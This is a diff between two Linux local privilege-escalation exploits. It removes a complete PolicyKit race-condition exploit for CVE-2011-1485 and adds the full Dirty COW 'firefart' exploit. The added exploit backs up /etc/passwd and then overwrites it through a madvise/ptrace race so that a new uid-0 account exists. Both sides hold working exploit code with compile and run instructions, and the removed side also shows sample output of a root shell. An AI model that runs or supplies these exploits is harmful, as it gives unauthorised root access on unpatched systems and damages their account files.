@@ -1,105 +1,193 @@
-/* polkit-pwnage.c
- *
- *
- * ==============================
- * =      PolicyKit Pwnage      =
- * =          by zx2c4          =
- * =        Sept 2, 2011        =
- * ==============================
- *
- *
- * Howdy folks,
- *
- * This exploits CVE-2011-1485, a race condition in PolicyKit.
- * 
- * davidz25 explains:
- * 
- * --begin--
- * Briefly, the problem is that the UID for the parent process of pkexec(1) is
- * read from /proc by stat(2)'ing /proc/PID. The problem with this is that
- * this returns the effective uid of the process which can easily be set to 0
- * by invoking a setuid-root binary such as /usr/bin/chsh in the parent
- * process of pkexec(1). Instead we are really interested in the real-user-id.
- * While there's a check in pkexec.c to avoid this problem (by comparing it to
- * what we expect the uid to be - namely that of the pkexec.c process itself which
- * is the uid of the parent process at pkexec-spawn-time), there is still a short
- * window where an attacker can fool pkexec/polkitd into thinking that the parent
- * process has uid 0 and is therefore authorized. It's pretty hard to hit this
- * window - I actually don't know if it can be made to work in practice.
- * --end--
- *
- * Well, here is, in fact, how it's made to work in practice. There is as he said an
- * attempted mitigation, and the way to trigger that mitigation path is something
- * like this:
- *
- *     $ sudo -u `whoami` pkexec sh
- *     User of caller (0) does not match our uid (1000)
- *
- * Not what we want. So the trick is to execl to a suid at just the precise moment
- * /proc/PID is being stat(2)'d. We use inotify to learn exactly when it's accessed,
- * and execl to the suid binary as our very next instruction.
- *
- * ** Usage **
- * $ pkexec --version
- * pkexec version 0.101
- * $ gcc polkit-pwnage.c -o pwnit
- * $ ./pwnit 
- * [+] Configuring inotify for proper pid.
- * [+] Launching pkexec.
- * sh-4.2# whoami
- * root
- * sh-4.2# id
- * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
- * sh-4.2#
- *
- * ** Targets **
- * This exploit is known to work on polkit-1 <= 0.101. However, Ubuntu, which
- * as of writing uses 0.101, has backported 0.102's bug fix. A way to check
- * this is by looking at the mtime of /usr/bin/pkexec -- April 22, 2011 or
- * later and you're out of luck. It's likely other distributions do the same.
- * Fortunately, this exploit is clean enough that you can try it out without
- * too much collateral.
- *
- *
- * greets to djrbliss and davidz25.
- *
- * - zx2c4
- * 2-sept-2011
- *
- */
+//
+// This exploit uses the pokemon exploit of the dirtycow vulnerability
+// as a base and automatically generates a new passwd line.
+// The user will be prompted for the new password when the binary is run.
+// The original /etc/passwd file is then backed up to /tmp/passwd.bak
+// and overwrites the root account with the generated line.
+// After running the exploit you should be able to login with the newly
+// created user.
+//
+// To use this exploit modify the user values according to your needs.
+//   The default is "firefart".
+//
+// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
+//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//
+// Compile with:
+//   gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+//
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+//   mv /tmp/passwd.bak /etc/passwd
+//
+// Exploit adopted by Christian "FireFart" Mehlmauer
+// https://firefart.at
+//
 
-
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <errno.h>
-#include <unistd.h>
+#include <stdint.h>
+#include <sys/mman.h>
 #include <sys/types.h>
-#include <sys/inotify.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
 
-int main(int argc, char **argv)
+const char *filename = "/etc/passwd";
+const char *backup_filename = "/tmp/passwd.bak";
+const char *salt = "firefart";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+};
+
+char *generate_password_hash(char *plaintext_pw) {
+  return crypt(plaintext_pw, salt);
+}
+
+char *generate_passwd_line(struct Userinfo u) {
+  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
+  int size = snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret = malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+}
+
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+
+int copy_file(const char *from, const char *to) {
+  // check if target file already exists
+  if(access(to, F_OK) != -1) {
+    printf("File %s already exists! Please delete it and run again\n",
+      to);
+    return -1;
+  }
+
+  char ch;
+  FILE *source, *target;
+
+  source = fopen(from, "r");
+  if(source == NULL) {
+    return -1;
+  }
+  target = fopen(to, "w");
+  if(target == NULL) {
+     fclose(source);
+     return -1;
+  }
+
+  while((ch = fgetc(source)) != EOF) {
+     fputc(ch, target);
+   }
+
+  printf("%s successfully backed up to %s\n",
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+}
+
+int main(int argc, char *argv[])
 {
-	printf("=============================\n");
-	printf("=      PolicyKit Pwnage     =\n");
-	printf("=          by zx2c4         =\n");
-	printf("=        Sept 2, 2011       =\n");
-	printf("=============================\n\n");
+  // backup file
+  int ret = copy_file(filename, backup_filename);
+  if (ret != 0) {
+    exit(ret);
+  }
 
-	if (fork()) {
-		int fd;
-		char pid_path[1024];
-		sprintf(pid_path, "/proc/%i", getpid());
-		printf("[+] Configuring inotify for proper pid.\n");
-		close(0); close(1); close(2);
-		fd = inotify_init();
-		if (fd < 0)
-			perror("[-] inotify_init");
-		inotify_add_watch(fd, pid_path, IN_ACCESS);
-		read(fd, NULL, 0);
-		execl("/usr/bin/chsh", "chsh", NULL);
-	} else {
-		sleep(1);
-		printf("[+] Launching pkexec.\n");
-		execl("/usr/bin/pkexec", "pkexec", "/bin/sh", NULL);
-	}
-	return 0;
+  struct Userinfo user;
+  // set values, change as needed
+  user.username = "testlicenta";
+  user.user_id = 0;
+  user.group_id = 0;
+  user.info = "pwned";
+  user.home_dir = "/root";
+  user.shell = "/bin/bash";
+
+  char *plaintext_pw;
+
+  if (argc >= 2) {
+    plaintext_pw = argv[1];
+    printf("Please enter the new password: %s\n", plaintext_pw);
+  } else {
+    plaintext_pw = getpass("Please enter the new password: ");
+  }
+
+  user.hash = generate_password_hash(plaintext_pw);
+  char *complete_passwd_line = generate_passwd_line(user);
+  printf("Complete line:\n%s\n", complete_passwd_line);
+
+  f = open(filename, O_RDONLY);
+  fstat(f, &st);
+  map = mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf("mmap: %lx\n",(unsigned long)map);
+  pid = fork();
+  if(pid) {
+    waitpid(pid, NULL, 0);
+    int u, i, o, c = 0;
+    int l=strlen(complete_passwd_line);
+    for(i = 0; i < 10000/l; i++) {
+      for(o = 0; o < l; o++) {
+        for(u = 0; u < 10000; u++) {
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        }
+      }
+    }
+    printf("ptrace %d\n",c);
+  }
+  else {
+    pthread_create(&pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  }
+
+  printf("Done! Check %s to see if the new user was created.\n", filename);
+  printf("You can log in with the username '%s' and the password '%s'.\n\n",
+    user.username, plaintext_pw);
+    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
+    backup_filename, filename);
+  return 0;
 }
